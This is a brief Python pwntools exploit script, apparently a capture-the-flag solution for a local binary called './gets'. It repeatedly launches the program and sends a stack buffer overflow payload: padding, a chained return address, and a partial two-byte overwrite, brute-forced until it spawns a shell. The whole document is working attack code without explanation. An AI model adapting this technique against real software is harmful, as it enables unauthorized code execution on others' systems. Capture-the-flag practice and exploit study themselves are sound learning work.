from pwn import *

for i in range(0x100):
    io = process('./gets')
    try:
        payload = 0x18 * 'a' + p64(0x40059B)
        for _ in range(2):
            payload += 'a' * 8 * 5 + p64(0x40059B)
        payload += 'a' * 8 * 5 + '\x16\x02'
        io.sendline(payload)

        io.sendline('ls')
        data = io.recv()
        print data
    except Exception:
        io.close()
        continue
    else:
        io.interactive()